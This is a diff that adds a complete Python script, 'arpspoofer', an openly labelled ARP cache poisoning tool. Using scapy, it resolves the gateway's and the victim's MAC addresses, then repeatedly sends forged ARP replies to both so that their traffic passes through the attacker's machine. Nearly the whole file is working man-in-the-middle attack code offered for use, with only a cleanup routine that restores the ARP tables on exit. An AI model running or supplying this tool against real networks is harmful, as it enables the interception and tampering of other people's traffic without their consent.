@@ -1,0 +1,215 @@
+#!/usr/bin/env python3
+
+from scapy.all import Ether, ARP, srp, sendp
+from getmac import get_mac_address
+from time import sleep, strftime
+from termcolor import colored
+import argparse
+
+################################################################################
+#                                                                              #
+# Copyright (C) 2024 ButeForgeFr                                               #
+#                                                                              #
+# arpspoofer v1.0.0  -  ARP Cache Poisoning tool                               #
+#                                                                              #
+#                                                                              #
+# GNU GENERAL PUBLIC LICENSE                                                   #
+#                                                                              #
+# This program is free software: you can redistribute it and/or modify         #
+# it under the terms of the GNU General Public License as published by         #
+# the Free Software Foundation, either version 3 of the License, or            #
+# (at your option) any later version.                                          #
+#                                                                              #
+# This program is distributed in the hope that it will be useful,              #
+# but WITHOUT ANY WARRANTY; without even the implied warranty of               #
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                #
+# GNU General Public License for more details.                                 #
+#                                                                              #
+# You should have received a copy of the GNU General Public License            #
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.        #
+#                                                                              #
+################################################################################
+
+def abstract_log(text: str, color: str, log_text:str, important: bool = False, date_color: str = "light_blue"):
+    attrs = []
+    lb = colored("[", "white")
+    rb = colored("]", "white")
+    print(lb + colored(strftime("%H:%M:%S"), date_color) + rb, end=" ")
+    print(lb, end="")
+    if(important):
+        attrs = ["bold"]
+    print(colored(log_text, color, attrs=attrs) + colored("] ", "white") + colored(text, "white", attrs=attrs))
+
+
+def info(text: str, important: bool = False):
+    abstract_log(text=text, color="light_green", log_text="INFO", important=important)
+
+def warning(text: str, important: bool = False):
+    abstract_log(text=text, color="yellow", log_text="WARNING", important=important)
+
+def error(text: str):
+    abstract_log(text=text, color="red", log_text="ERROR", important=True)
+
+
+def critical(text: str):
+    abstract_log(text=text, color="red", log_text="CRITICAL", important=True)
+
+
+def banner():
+    """
+    Display the script banner
+    """
+    print(
+        colored(f"""\n                             ___\n""", "yellow", attrs=["bold"]) +
+        colored(f""" ___ ___ ___ ___ ___ ___ ___|  _|___ ___ \n""", "yellow", attrs=["bold"]) +
+        colored(f"""| .'| ,_| . |_ -| . | . | . |  _| ._| ,_|""", "yellow", attrs=["bold"]) + colored("    ARP Cache poisoning tool\n", "white") +
+        colored(f"""|__,|_| |  _|___|  _|___|___|_| |_'_|_|  """, "yellow", attrs=["bold"]) + colored("    (", "white") + colored("@NullBrunk", "red") + colored(")\n", "white") +
+        colored(f"""        |_|     |_|\n""", "yellow", attrs=["bold"])
+    ) 
+
+
+def parse_args():
+    """
+    Parses the CLI given arguments
+    Returns the gateway IP, target IP, Interface Name and delay
+    """
+
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument("-g", help="The gateway IP address", metavar="GATEWAY_IP", required=True)
+    parser.add_argument("-t", help="The target IP address", metavar="TARGET_IP", required=True) 
+    parser.add_argument("-i", metavar="INAME", help="Interface name", required=True) 
+    parser.add_argument("-d", metavar="DELAY", help="Delay between each ARP packet (default: 10sec)", default=10, required=False, type=int,) 
+
+    args = parser.parse_args()
+    return args.g, args.t, args.d, args.i
+
+
+def get_mac(ip: str) -> str:
+    """
+    Retrieve MAC address from IP by performing an ARP who-has request.
+    """
+
+    # [0]    ->  "Answered" requests
+    # [0]    ->  Get the first response
+    # [1]    ->  Get the answer part
+    # .hwsrc ->  Get the src mac of the responder
+    return srp(
+        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=ip), timeout=4, verbose=False
+    )[0][0][1].hwsrc
+
+
+class ACP:
+    def __init__(self, gateway_ip: str, victim_ip: str, attacker_mac: str, delay: int) -> None:
+        # Initialize first victim ip and mac
+        self.gateway_ip = gateway_ip 
+        self.gateway_mac = get_mac(self.gateway_ip)
+
+        # Initialize second victim ip and mac
+        self.victim_ip = victim_ip 
+        self.victim_mac = get_mac(self.victim_ip)
+
+        # Initialize attacker and mac
+        self.attacker_mac = attacker_mac
+        
+        self.delay = delay
+
+
+    def show_is_at(self, target_ip1: str, target_ip2: str, mac_address: str) -> None:
+        info(f"ARP to {target_ip2} - {target_ip1} is-at {mac_address}", True)
+
+    def send_is_at(self, dst_ip: str, dst_mac: str, src_ip: str, src_mac: str) -> None:
+        """
+        Send an is-at ARP reply
+        """
+
+        sendp(ARP(
+            op="is-at",         # ARP reply
+            pdst=dst_ip,        # Destination IP
+            hwdst=dst_mac,      # Destination MAC
+            psrc=src_ip,        # Source IP (The ip we are spoofing)
+            hwsrc=src_mac,      # Source MAC (Our mac address)
+        ), verbose=False )
+
+
+    def poison_arp(self) -> None:
+        """
+        Perform an ARP cache poisoning attack by sending a fraudulent ARP reply (is-at) to the victim.
+        """
+
+        # Trick the victim 
+        self.send_is_at(
+            dst_ip=self.victim_ip, 
+            dst_mac=self.victim_mac, 
+            src_ip=self.gateway_ip,     # We spoof the gateway ip:
+            src_mac=self.attacker_mac,  # Hey victim, gateway IS AT our_mac_address
+        )
+        self.show_is_at(self.gateway_ip, self.victim_ip, self.attacker_mac)
+
+        # Trick the gateway
+        self.send_is_at(
+            dst_ip=self.gateway_ip,     
+            dst_mac=self.gateway_mac, 
+            src_ip=self.victim_ip,      # We spoof the victim ip:
+            src_mac=attacker_mac,       # Hey gateway, victim IS AT our_mac_address
+        )
+        self.show_is_at(self.victim_ip, self.gateway_ip, self.attacker_mac)
+
+
+    def restore_arp(self) -> None:
+        """
+        Restore ARP table by sending an unspoofed is-at request to the two victims
+        """
+        # Restore victim ARP cache
+        self.send_is_at(
+            dst_ip=self.victim_ip,
+            dst_mac=self.victim_mac,
+            src_ip=self.gateway_ip,
+            src_mac=self.gateway_mac,
+        )
+        # Restore gateway ARP cache
+        self.send_is_at(
+            dst_ip=self.gateway_ip,     
+            dst_mac=self.gateway_mac, 
+            src_ip=self.victim_ip,
+            src_mac=self.victim_mac,
+        )
+
+
+    def run(self):
+        # Send 1 is-at reply
+        if(delay == 0):
+            self.poison_arp()
+            self.restore_arp()
+        else:
+            # Send is-at replies every delay second
+            while True:
+                self.poison_arp()
+                warning(f"sleeping {delay} sec")
+                sleep(delay)
+
+
+
+if __name__ == "__main__":    
+    banner()
+
+    gateway_ip, victim_ip, delay, iname = parse_args()
+    attacker_mac = get_mac_address(interface=iname)
+
+    if(attacker_mac == None):
+        critical(f"could not retrieve MAC address for interface {iname}")
+        exit()
+
+    try:
+        info("gathering mac addresses", True)
+        acp = ACP(gateway_ip=gateway_ip, victim_ip=victim_ip, attacker_mac=attacker_mac, delay=delay)
+       
+        acp.run()
+    except PermissionError:
+        critical("this script must be run as root")
+    except IndexError:
+        critical("failed to retrieve MAC addresses")
+    except KeyboardInterrupt:
+        print()
+        error("user exit")
+        acp.restore_arp()
